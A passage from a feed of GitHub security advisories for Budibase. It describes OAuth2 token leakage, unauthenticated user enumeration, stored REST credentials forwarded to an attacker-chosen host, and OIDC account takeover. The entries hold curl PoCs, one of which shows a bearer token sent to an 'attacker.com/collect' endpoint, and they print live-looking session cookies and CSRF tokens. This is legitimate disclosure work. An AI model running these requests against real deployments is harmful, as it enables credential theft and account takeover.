  stepId: data.automation.definition.trigger.stepId,
  inputs: null,
  outputs: data.event,  // data.event includes user.oauth2 tokens
}
</code></pre>
<p><strong>Step 4: Result broadcast without sanitization</strong></p>
<p>The full result (including <code>trigger.outputs.user.oauth2</code>) is exposed via two vectors:</p>
<ol>
<li><p><strong>WebSocket broadcast</strong> — <code>builderSocket.emitToRoom()</code> calls <code>this.io.in(room).emit()</code> (<code>packages/server/src/websockets/websocket.ts:291</code>) which sends to ALL sockets in the app's room, not just the originator.</p>
</li>
<li><p><strong>Test status endpoint</strong> — <code>recordTestProgress()</code> stores the result in a Map keyed by <code>${appId}:${automationId}</code> with no user isolation (<code>packages/server/src/automations/testProgress.ts:41-74</code>). Any builder can call <code>GET /api/automations/:id/test/status</code> to retrieve another user's test results.</p>
</li>
</ol>
<h2 id="poc">PoC</h2>
<p>Requires two builder-level users on the same Budibase app, where User A authenticates via SSO/OIDC (Google, Azure AD, etc.) which provides OAuth2 tokens.</p>
<pre><code class="language-bash"># Step 1: User A (SSO-authenticated builder) tests an automation asynchronously
curl -X POST http://localhost:10000/api/automations/&lt;automation-id&gt;/test?async=true \
  -H 'x-budibase-app-id: app_dev_&lt;appid&gt;' \
  -H 'Cookie: budibase:auth=&lt;userA_session&gt;' \
  -H 'Content-Type: application/json' \
  -d '{"row": {"tableId": "ta_xxx"}}'
# Returns: {"message": "Automation test started"}

# Step 2: User B (another builder on the same app) polls the test status
curl -X GET http://localhost:10000/api/automations/&lt;automation-id&gt;/test/status \
  -H 'x-budibase-app-id: app_dev_&lt;appid&gt;' \
  -H 'Cookie: budibase:auth=&lt;userB_session&gt;'

# Response includes the full automation result with:
# result.trigger.outputs.user.oauth2.accessToken = "ya29.a0AfH6SM..."
# result.trigger.outputs.user.oauth2.refreshToken = "1//0eXyz..."
</code></pre>
<p>Additionally, User B can passively receive the tokens by simply having the Budibase builder open (connected via WebSocket), as the <code>BuilderSocketEvent.AutomationTestProgress</code> event with <code>status: "complete"</code> includes the full result payload.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>OAuth2 access tokens</strong> for external services (Google Workspace, Azure AD, GitHub, etc.) are exposed to co-builders of the same app. These tokens can be used to access external APIs as the victim user.</li>
<li><strong>OAuth2 refresh tokens</strong> provide persistent access — an attacker can generate new access tokens even after the original expires, maintaining long-term access to the victim's external service accounts.</li>
<li>The attack is passive via WebSocket — an attacker only needs to have the builder UI open to receive tokens when any co-builder tests an automation.</li>
<li>Test results persist in memory for 5 minutes (TTL in <code>testProgress.ts:15</code>), providing a window for polling-based attacks.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Strip OAuth2 tokens from automation test results before storing/broadcasting them. The tokens are needed during automation execution but should not be included in the result sent to clients.</p>
<p>In <code>packages/server/src/api/controllers/automation.ts</code>, sanitize the result before passing to <code>emitProgress</code>:</p>
<pre><code class="language-typescript">function sanitizeAutomationResult(result: AutomationResults): AutomationResults {
  const sanitized = cloneDeep(result)
  if (sanitized.trigger?.outputs?.user?.oauth2) {
    delete sanitized.trigger.outputs.user.oauth2
  }
  for (const step of sanitized.steps || []) {
    if (step.outputs?.user?.oauth2) {
      delete step.outputs.user.oauth2
    }
  }
  return sanitized
}
</code></pre>
<p>Apply sanitization in the <code>emitProgress</code> callback at line 290 and before returning <code>ctx.body</code> at line 342:</p>
<pre><code class="language-typescript">emitProgress({
  status: "complete",
  occurredAt: Date.now(),
  result: sanitizeAutomationResult(result),
})
</code></pre>
<p>Additionally, the <code>testProgress</code> store should be scoped per-user (keyed by <code>${appId}:${automationId}:${userId}</code>) so that one builder's test results are not accessible to another builder via the <code>testStatus</code> endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-gh4h-34gr-87r7">https://github.com/Budibase/budibase/security/advisories/GHSA-gh4h-34gr-87r7</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19107">https://github.com/Budibase/budibase/pull/19107</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/bca426de7dc36d680285295655dc640dea2aab21">https://github.com/Budibase/budibase/commit/bca426de7dc36d680285295655dc640dea2aab21</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.25">https://github.com/Budibase/budibase/releases/tag/3.39.25</a></li>
<li><a href="https://github.com/advisories/GHSA-gh4h-34gr-87r7">https://github.com/advisories/GHSA-gh4h-34gr-87r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh4h-34gr-87r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T21:25:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: Unauthenticated user information disclosure via public tenant user lookup endpoint]]></title>
        <id>https://github.com/advisories/GHSA-hr66-5mqr-8mpx</id>
        <link href="https://github.com/advisories/GHSA-hr66-5mqr-8mpx"/>
        <updated>2026-07-24T21:25:02.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>The Budibase Worker service exposes a public, unauthenticated API endpoint (<code>GET /api/global/users/tenant/:id</code>) that returns sensitive user information including <code>tenantId</code>, <code>userId</code>, <code>email</code>, and <code>ssoId</code>. The endpoint is registered in the <code>PUBLIC_ENDPOINTS</code> list with a <code>TODO</code> comment acknowledging it "should be an internal API." Any unauthenticated party can enumerate user emails or IDs to extract sensitive tenant and user metadata, enabling targeted attacks against multi-tenant deployments.</p>
<h4 id="details">Details</h4>
<p><strong>Public endpoint registration</strong> at <code>packages/worker/src/api/index.ts</code> lines 56-59:</p>
<pre><code class="language-typescript">// TODO: This should be an internal api
{
  route: "/api/global/users/tenant/:id",
  method: "GET",
},
</code></pre>
<p>This endpoint is listed in <code>PUBLIC_ENDPOINTS</code>, which is passed to <code>auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)</code> at line 154. When a request matches a public endpoint pattern, the authentication middleware sets <code>ctx.publicEndpoint = true</code> and calls <code>next()</code> without performing any authentication (verified at <code>packages/backend-core/src/middleware/authenticated.ts</code> lines 124-126, 249-251).</p>
<p>All subsequent middleware also skips for public endpoints:</p>
<ul>
<li><code>buildTenancyMiddleware</code> — passes through</li>
<li><code>activeTenant</code> — passes through</li>
<li><code>buildCsrfMiddleware</code> — skipped for GET methods (line 48 of csrf.ts)</li>
<li>The <code>budibaseAccess</code> gate at lines 160-168 explicitly returns <code>next()</code> when <code>ctx.publicEndpoint</code> is true</li>
</ul>
<p><strong>Route registration</strong> at <code>packages/worker/src/api/routes/global/users.ts</code> line 139:</p>
<pre><code class="language-typescript">loggedInRoutes
  .get("/api/global/users/tenant/:id", controller.tenantUserLookup)
</code></pre>
<p><code>loggedInRoutes</code> has no auth middleware group — it is created with <code>endpointGroupList.group()</code> (no middleware).</p>
<p><strong>Handler implementation</strong> at <code>packages/worker/src/api/controllers/global/users.ts</code> lines 548-562:</p>
<pre><code class="language-typescript">export const tenantUserLookup = async (
  ctx: UserCtx&lt;void, LookupTenantUserResponse&gt;
) =&gt; {
  const id = ctx.params.id
  // is email, check its valid
  if (id.includes("@") &amp;&amp; !emailValidator.validate(id)) {
    ctx.throw(400, `${id} is not a valid email address to lookup.`)
  }
  const user = await userSdk.core.getFirstPlatformUser(id)
  if (user) {
    ctx.body = user    // Returns full PlatformUser object — no field filtering
  } else {
    ctx.throw(400, "No tenant user found.")
  }
}
</code></pre>
<p>The <code>id</code> parameter accepts either an email address (detected by <code>@</code> presence) or a user ID. The response returns the <strong>full</strong> <code>PlatformUser</code> object from <code>packages/types/src/documents/platform/users.ts</code>:</p>
<pre><code class="language-typescript">export interface PlatformUserByEmail extends Document {
  tenantId: string    // Tenant identifier
  userId: string      // Internal user ID
}

export interface PlatformUserById extends Document {
  tenantId: string    // Tenant identifier
  email?: string      // User email address
  ssoId?: string      // SSO provider identifier
}

export interface PlatformUserBySsoId extends Document {
  tenantId: string    // Tenant identifier
  userId: string      // Internal user ID
  email: string       // User email address
  ssoId?: string      // SSO provider identifier
}
</code></pre>
<p>The lookup function (<code>packages/backend-core/src/users/lookup.ts:48-53</code>) queries the <code>PLATFORM_USERS_LOWERCASE</code> CouchDB view with <code>include_docs: true</code>, returning the complete platform user document including CouchDB <code>_id</code> and <code>_rev</code>.</p>
<p><strong>Affected files:</strong></p>
<ul>
<li><code>packages/worker/src/api/index.ts:56-59</code> — Public endpoint registration</li>
<li><code>packages/worker/src/api/routes/global/users.ts:139</code> — Route on unauthenticated group</li>
<li><code>packages/worker/src/api/controllers/global/users.ts:548-562</code> — Handler returning full user object</li>
<li><code>packages/backend-core/src/users/lookup.ts:48-53</code> — Platform user lookup with <code>include_docs: true</code></li>
<li><code>packages/types/src/documents/platform/users.ts:6-36</code> — PlatformUser types</li>
</ul>
<h4 id="poc">PoC</h4>
<p><strong>Static verification:</strong></p>
<ol>
<li>Observe <code>packages/worker/src/api/index.ts:56-59</code>: endpoint in <code>PUBLIC_ENDPOINTS</code> with <code>// TODO: This should be an internal api</code></li>
<li>Trace handler at <code>packages/worker/src/api/controllers/global/users.ts:548-562</code>: no auth checks, returns <code>ctx.body = user</code> (full object)</li>
<li>Trace middleware chain: all middleware passes through for <code>ctx.publicEndpoint === true</code></li>
<li>Confirm no field filtering, sanitization, or authorization between request and response</li>
</ol>
<p><strong>Dynamic verification (requires running Budibase instance with at least one user):</strong></p>
<pre><code class="language-bash"># No authentication headers or cookies required
# Lookup by email:
curl -s http://localhost:4002/api/global/users/tenant/admin@example.com

# Response (200 OK):
# {
#   "_id": "admin@example.com",
#   "_rev": "1-abc123...",
#   "tenantId": "tenant-uuid-here",
#   "userId": "us_uuid-here"
# }

# Lookup by user ID:
curl -s http://localhost:4002/api/global/users/tenant/us_someuserid123

# Response (200 OK):
# {
#   "_id": "us_someuserid123",
#   "_rev": "1-abc123...",
#   "tenantId": "tenant-uuid-here",
#   "email": "admin@example.com",
#   "ssoId": "google-oauth-id"
# }

# Non-existent user:
curl -s http://localhost:4002/api/global/users/tenant/nonexistent@example.com
# Response: 400 "No tenant user found."
# (Different response confirms user enumeration)
</code></pre>
<p><strong>Negative case:</strong> Requesting a non-existent user returns HTTP 400 with <code>"No tenant user found."</code>, while an existing user returns HTTP 200 with full data. The different status codes confirm user existence, enabling enumeration.</p>
<h4 id="impact">Impact</h4>
<p>This is a <strong>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</strong> vulnerability.</p>
<p><strong>Who is impacted:</strong> All Budibase deployments — both self-hosted and cloud. The impact is highest for multi-tenant (cloud) deployments where tenant IDs are security boundaries and user enumeration across tenants enables targeted attacks.</p>
<p>An unauthenticated attacker can:</p>
<ol>
<li><strong>Enumerate all user accounts</strong> by testing known or guessed email addresses against the endpoint</li>
<li><strong>Extract tenant IDs</strong> for any known user, enabling targeted cross-tenant attacks</li>
<li><strong>Extract user IDs</strong> (<code>userId</code>) for use in other API calls or attacks</li>
<li><strong>Extract SSO identifiers</strong> (<code>ssoId</code>) which may link to external identity providers (Google, OIDC)</li>
<li><strong>Confirm user existence</strong> through different HTTP responses (200 vs 400)</li>
<li><strong>Harvest CouchDB revision tokens</strong> (<code>_rev</code>) which could assist in CouchDB-level attacks</li>
</ol>
<p>The returned tenant IDs are particularly dangerous in multi-tenant deployments because they identify the security boundary between organizations. Combined with the hardcoded session keys (separate finding), an attacker could use enumerated tenant IDs to craft targeted session fixation attacks.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ol>
<li><strong>Remove the endpoint from <code>PUBLIC_ENDPOINTS</code></strong> and move it to internal-only routes, as the TODO comment at line 56 already suggests</li>
<li><strong>Add authentication and authorization</strong> if the endpoint must remain accessible — require at least <code>builderOrAdmin</code> role</li>
<li><strong>Limit returned fields</strong> to only what the consumer actually needs (strip <code>_rev</code>, <code>ssoId</code>, and other sensitive fields)</li>
<li><strong>Return generic 404</strong> for both "not found" and "access denied" to prevent user enumeration</li>
<li><strong>Add rate limiting</strong> to prevent automated mass enumeration</li>
<li><strong>Regression test:</strong> Add a test verifying <code>GET /api/global/users/tenant/:id</code> returns 403 without authentication</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-hr66-5mqr-8mpx">https://github.com/Budibase/budibase/security/advisories/GHSA-hr66-5mqr-8mpx</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19221">https://github.com/Budibase/budibase/pull/19221</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/e6bf245fbfdaa35804ef7ee901103282edf0c381">https://github.com/Budibase/budibase/commit/e6bf245fbfdaa35804ef7ee901103282edf0c381</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.32">https://github.com/Budibase/budibase/releases/tag/3.39.32</a></li>
<li><a href="https://github.com/advisories/GHSA-hr66-5mqr-8mpx">https://github.com/advisories/GHSA-hr66-5mqr-8mpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr66-5mqr-8mpx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:25:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: Unauthenticated REST Datasource Credential Theft via Cross-Origin Auth Leak ]]></title>
        <id>https://github.com/advisories/GHSA-mqhr-6j6h-74p5</id>
        <link href="https://github.com/advisories/GHSA-mqhr-6j6h-74p5"/>
        <updated>2026-07-24T21:22:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Budibase attaches a REST datasource's stored credentials (Bearer/Basic tokens and static headers) to an outgoing request before it decides which host the request goes to, and never checks that the destination host matches the datasource. A query's request path can be pointed at any host (via an absolute URL or a user-supplied <code>{{ parameter }}</code>), so the stored credentials are delivered to an attacker-chosen server. Because a query can be published with the PUBLIC role, this is reachable by a fully unauthenticated attacker with one HTTP request. The credentials are masked (<code>--secret-value--</code>) everywhere in the API, yet this recovers them in cleartext. This is a bypass of GHSA-3gp5 (which fixed the base-URL rewrite vector but added no same-origin check; the query-path vector remains, now unauthenticated).</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>packages/server/src/integrations/rest.ts</code>: <code>_req()</code> builds <code>authHeaders = getAuthHeaders(...)</code> from the stored auth configs and merges them with <code>config.defaultHeaders</code> into every request, before the URL is resolved. <code>getUrl()</code>: if the (parameter-enriched) query <code>path</code> starts with <code>http</code>, the datasource base URL is ignored and <code>path</code> becomes the absolute request URL. There is no comparison between the resolved request host and the datasource base host before the credentials are attached. The execute route <code>POST /api/v2/queries/:queryId</code> runs under <code>authorized(QUERY, WRITE)</code>; a query published at role PUBLIC is executable with no session.</p>
<p>POC </p>
<h2 id="reproduction--copy-each-line-paste-in-your-terminal-press-enter">Reproduction — copy each line, paste in your terminal, press Enter,</h2>
<p>Line 1:</p>
<pre><code>DSID=$(curl -s -X POST "https://hasinocompany.budibase.app/api/datasources" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"poc-rest","source":"REST","type":"datasource","config":{"url":"https://example.org","authConfigs":[{"_id":"ac1","name":"tok","type":"bearer","config":{"token":"UNAUTH_LEAK_TOKEN_5150"}}],"defaultHeaders":{"X-Static-Secret":"STATIC_HDR_LEAK_4242"}}},"fetchSchema":false,"tablesFilter":[]}' | python3 -c "import sys,json;print(json.load(sys.stdin)['datasource']['_id'])"); echo "datasource=$DSID"

RESPONSE

datasource=datasource_9938805b2d0348a4a4f28dc9d1c97f19

</code></pre>
<p>Line 2:</p>
<pre><code>QID=$(curl -s -X POST "https://hasinocompany.budibase.app/api/queries" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d "{\"datasourceId\":\"$DSID\",\"name\":\"pocq\",\"parameters\":[{\"name\":\"t\",\"default\":\"\"}],\"fields\":{\"path\":\"{{ t }}\",\"bodyType\":\"none\",\"authConfigId\":\"ac1\",\"authConfigType\":\"bearer\"},\"queryVerb\":\"read\",\"transformer\":\"return data\",\"schema\":{},\"readable\":true}" | python3 -c "import sys,json;print(json.load(sys.stdin)['_id'])"); echo "query=$QID"
</code></pre>
<p>RESPONSE</p>
<p>query=query_datasource_9938805b2d0348a4a4f28dc9d1c97f19_7727920d8ccb4708a495eafb5a1351a7</p>
<p>Line 3:</p>
<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/permission/PUBLIC/$QID/write" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" &gt;/dev/null; curl -s -X POST "https://hasinocompany.budibase.app/api/permission/PUBLIC/$QID/read" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" &gt;/dev/null; curl -s -X POST "https://hasinocompany.budibase.app/api/applications/app_dev_hasinocompany_bcb6316e0d014f91939c812389012415/publish" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" &gt;/dev/null; echo published
</code></pre>
<p>RESPONSE</p>
<p>published</p>
<p>Line 4 — THE BUG (anonymous, no cookie — this prints the leaked Bearer UNAUTH_LEAK_TOKEN_5150):</p>
<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/v2/queries/$QID" -H "x-budibase-app-id: app_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"parameters":{"t":"https://postman-echo.com/get"}}'
</code></pre>
<p>RESPONSE </p>
<p>{"data":[{"args":{},"headers":{"host":"postman-echo.com","accept":"<em>/</em>","accept-language":"*","accept-encoding":"gzip, br","user-agent":"undici","sec-fetch-mode":"cors","x-static-secret":"STATIC_HDR_LEAK_4242","authorization":"Bearer UNAUTH_LEAK_TOKEN_5150","x-datadog-trace-id":"3035031720617373998","x-datadog-parent-id":"5509262114738533737","x-datadog-sampling-priority":"0","x-datadog-tags":"_dd.p.tid=6a56b19a00000000,_dd.p.llmobs_ml_app=app-service","traceparent":"00-6a56b19a000000002a1e99450570f12e-4c74d4b43b81f569-00","tracestate":"dd=t.tid:6a56b19a00000000;t.dm:-1;s:0;p:4c74d4b43b81f569","x-forwarded-proto":"https"},"url":"<a href="https://postman-echo.com/get%22%7D%5D,%22pagination%22:%7B%7D,%22headers%22:%7B%22cf-cache-status%22:%22DYNAMIC%22,%22cf-ray%22:%22a1b3cda318a3f0e7-DUB%22,%22content-encoding%22:%22gzip%22,%22content-type%22:%22application/json">https://postman-echo.com/get"}],"pagination":{},"headers":{"cf-cache-status":"DYNAMIC","cf-ray":"a1b3cda318a3f0e7-DUB","content-encoding":"gzip","content-type":"application/json</a>; charset=utf-8","date":"Tue, 14 Jul 2026 22:00:58 GMT","etag":"W/"292-YpfNwvZmX1jVU7GPgCQX7hoZtMw"","server":"cloudflare","set-cookie":"_cfuvid=lJDfxAv0j6gmoaOpkyXVKpYK0yYSlYwgBjSHcA.rn.0-1784066458.0972874-1.0.1.1-q7WOtNlMsl5YmqkV34ms7hdy4oi1sw17X9IguTaJOKE; HttpOnly; SameSite=None; Secure; Path=/; Domain=postman-echo.com","vary":"Accept-Encoding","x-envoy-upstream-service-time":"4"},"code":200,"size":"658B","time":"139ms"}  </p>
<h3 id="actual-output-of-line-4-the-leaked-credential">Actual output of Line 4 (the leaked credential)</h3>
<p>The anonymous request returns HTTP 200; the outbound <code>headers</code> echoed by <code>postman-echo.com</code> contain the datasource's stored, otherwise-masked credentials:</p>
<pre><code class="language-json">{"data":[{"headers":{"host":"postman-echo.com","x-static-secret":"STATIC_HDR_LEAK_4242","authorization":"Bearer UNAUTH_LEAK_TOKEN_5150"}}]}
</code></pre>
<p><code>authorization: Bearer UNAUTH_LEAK_TOKEN_5150</code> and <code>x-static-secret: STATIC_HDR_LEAK_4242</code> were delivered to a host chosen by a fully anonymous caller. Confirmed 3/3 separate runs.</p>
<h2 id="full-real-world-attack">Full Real-World Attack</h2>
<pre><code>1. A builder has a REST datasource with stored auth (Bearer/API key) and a query
   whose path uses a parameter, published at PUBLIC (customer-facing app).
2. The attacker needs no account. They read the published app id + query id from
   the published app, then send ONE request:
     POST /api/v2/queries/&lt;queryId&gt;
     x-budibase-app-id: &lt;prodAppId&gt;
     {"parameters":{"t":"https://attacker.com/collect"}}
3. Budibase attaches Authorization: Bearer &lt;token&gt; and sends it to attacker.com.
4. attacker.com logs the header =&gt; the datasource's secret token.
5. The attacker calls the third-party API directly as the victim organisation.
</code></pre>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Who / what is affected</th>
<th>How</th>
</tr>
</thead>
<tbody><tr>
<td>Every REST datasource with stored auth used by a PUBLIC query</td>
<td>Its Bearer/Basic token + static headers are exfiltrated</td>
</tr>
<tr>
<td>The third-party service behind that datasource</td>
<td>Attacker uses the stolen token directly (data theft / abuse)</td>
</tr>
<tr>
<td>Unauthenticated attackers</td>
<td>One request, no login, no CSRF, no user interaction</td>
</tr>
<tr>
<td>The credential-masking control</td>
<td>Fully defeated - masked secrets recovered in cleartext</td>
</tr>
</tbody></table>
<h2 id="recommended-fix">Recommended Fix</h2>
<ol>
<li>Before attaching stored auth, require the resolved request host to equal the datasource base host (strict same-origin check); strip stored credentials on any cross-origin resolution.</li>
<li>Reject absolute-URL query paths and host/scheme changes introduced via path parameter bindings.</li>
<li>Re-audit the GHSA-3gp5 fix - it closed the base-URL rewrite vector only; the query-path vector remained and is now reachable unauthenticated.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-mqhr-6j6h-74p5">https://github.com/Budibase/budibase/security/advisories/GHSA-mqhr-6j6h-74p5</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19239">https://github.com/Budibase/budibase/pull/19239</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/8b1bca71501b11c68310351ef4f2c3028b2d5f08">https://github.com/Budibase/budibase/commit/8b1bca71501b11c68310351ef4f2c3028b2d5f08</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.1">https://github.com/Budibase/budibase/releases/tag/3.40.1</a></li>
<li><a href="https://github.com/advisories/GHSA-mqhr-6j6h-74p5">https://github.com/advisories/GHSA-mqhr-6j6h-74p5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mqhr-6j6h-74p5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-24T21:22:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: OIDC SSO account takeover: incoming identity linked by email without checking email_verified]]></title>
        <id>https://github.com/advisories/GHSA-hp6v-6jw7-gv2f</id>
        <link href="https://github.com/advisories/GHSA-hp6v-6jw7-gv2f"/>
        <updated>2026-07-24T21:17:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Budibase's OIDC SSO login links an incoming SSO identity to an existing Budibase account <strong>by email address alone</strong>, without ever checking the <code>email_verified</code> claim of the OIDC ID token. Budibase first tries to match the IdP <code>sub</code>; when that misses (any fresh attacker IdP account) it silently falls back to matching by the <code>email</code> claim and <strong>merges into the existing account by email</strong>, preserving that account's <code>_id</code> and roles. Because the <code>email_verified</code> flag is never read, an attacker who can make a <strong>configured/trusted</strong> IdP emit a token carrying <code>email = &lt;victim&gt;</code> with <code>email_verified = false</code> is logged into Budibase <strong>as the victim</strong>, inheriting the victim's roles (including global admin/builder). Per OIDC Core §5.7 the <code>email</code> claim MUST NOT be used as an identity key unless <code>email_verified</code> is <code>true</code>; Budibase effectively delegates all account-linking trust to every configured IdP's email-verification policy while checking nothing itself. Full account takeover of any existing Budibase user, including the instance owner.</p>
<h3 id="details">Details</h3>
<p>The OIDC verify callback extracts the email and never consults <code>email_verified</code>:</p>
<ul>
<li><code>packages/backend-core/src/middleware/passport/sso/oidc.ts:59</code> — <code>email: getEmail(profile, jwtClaims)</code>.</li>
<li><code>getEmail</code> (<code>oidc.ts:113-135</code>) returns <code>profile._json.email</code> -&gt;<code>jwtClaims.email</code> -&gt; <code>preferred_username</code>. <strong>No <code>email_verified</code> check.</strong></li>
<li><code>buildJwtClaims</code> (<code>oidc.ts:99-107</code>) assembles claims from <code>_json.email</code>/<code>emails[0].value</code> — no verification flag is read. <code>grep -r email_verified packages/</code> -&gt; 0 hits.</li>
</ul>
<p>The email is then used as the <strong>account-linking key</strong>:</p>
<ul>
<li><code>sso.authenticate(...)</code> -&gt; <code>packages/backend-core/src/middleware/passport/sso/sso.ts</code>:<ul>
<li><code>:38,44</code> <code>users.getById(generateGlobalUserID(details.userId))</code> keyed on the IdP <code>sub</code>; for a fresh attacker IdP account this 404s and is swallowed (<code>:45-54</code>).</li>
<li><code>:57-59</code> <strong>fallback:</strong> <code>dbUser = await users.getGlobalUserByEmail(details.email)</code> -&gt; loads the <strong>victim's</strong> account (victim <code>_id</code> + roles) purely by email (<code>packages/backend-core/src/users/users.ts:100-124</code>, <code>USER_BY_EMAIL</code> view, no binding to the IdP <code>sub</code>).</li>
<li><code>syncUser(...)</code> (<code>sso.ts:80,102-138</code>) spreads <code>...user</code>, preserving the victim <code>_id</code>/<code>tenantId</code>/<code>roles</code>; only overwrites provider fields.</li>
</ul>
</li>
<li><code>UserDB.save</code> (<code>packages/backend-core/src/users/db.ts:235</code>): because <code>ssoUser._id</code> is the victim's, the <code>_id</code> branch runs (<code>:253</code>), <code>getById(_id)</code> matches the victim (<code>:256</code>), the "Email address cannot be changed" guard (<code>:257-259</code>) does not fire (<code>dbUser.email === email</code>), and the <code>EmailUnavailableError</code> guard (<code>:269-275</code>) is skipped (it only runs in the <code>!dbUser</code> branch). The merge proceeds silently; a session JWT is issued for the victim.</li>
</ul>
<p>Per OIDC Core §5.7, the <code>email</code> claim MUST NOT be used as an identity key unless <code>email_verified</code> is <code>true</code>. Budibase never reads the flag.</p>
<p><strong>Preconditions (attack requirement — <code>AT:P</code>):</strong> the attacker must be able to authenticate through an IdP that the Budibase instance <strong>trusts</strong> AND get that IdP to assert the victim's email with <code>email_verified = false</code>. This is reachable, not exotic:</p>
<ul>
<li><strong>Self-registration with an unverified email — Keycloak and Authentik ship with <em>"Verify Email" OFF by default</em>; if the trusted IdP allows public sign-up, the attacker registers a new account and simply enters <code>email = &lt;victim&gt;</code> at sign-up. No confirmation email is needed — the IdP stores and asserts it unverified.</strong></li>
<li><strong>Self-service profile editing</strong> — many IdPs let a logged-in user change their own email without forced re-verification.</li>
<li><strong>Attacker-operated / federated IdP or permissive social login</strong> — where the attacker controls or influences a trusted provider, or the provider asserts a user-typed (unverified) email.
It is <strong>not</strong> exploitable through a strict corporate IdP that enforces email verification (there <code>email_verified = true</code> and the attacker cannot claim the victim's address) — which is exactly why Budibase must check the flag rather than assume every configured IdP enforces it. The defect is unconditional on the Budibase side; the attack requirement is purely the (default, common) IdP email policy.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Reproduced live on Budibase <code>3.39.14</code> (self-hosted, community license) against a stock <strong>Keycloak 26</strong> realm <code>budi</code> with default "Verify Email" = off; OIDC client registered and activated in Budibase.</p>
<p><strong>Setup:</strong> a pre-existing <strong>victim</strong> global-admin Budibase account <code>victim@stand.local</code> (<code>_id = us_1ab2dfcf…</code>, local account, <em>no IdP link</em>). The attacker owns their <strong>own</strong> IdP account (<code>attacker</code>, distinct <code>sub</code>) and can set its email attribute unverified.</p>
<p><strong>Step 1 — the IdP asserts the claim (proves <code>email_verified=false</code>):</strong></p>
<pre><code>POST /realms/budi/protocol/openid-connect/token   (Keycloak)
grant_type=password&amp;client_id=budibase&amp;client_secret=…&amp;username=attacker&amp;password=Attacker123!&amp;scope=openid email profile
-&gt; id_token payload: { "sub":"3cf58c45-…", "preferred_username":"attacker",
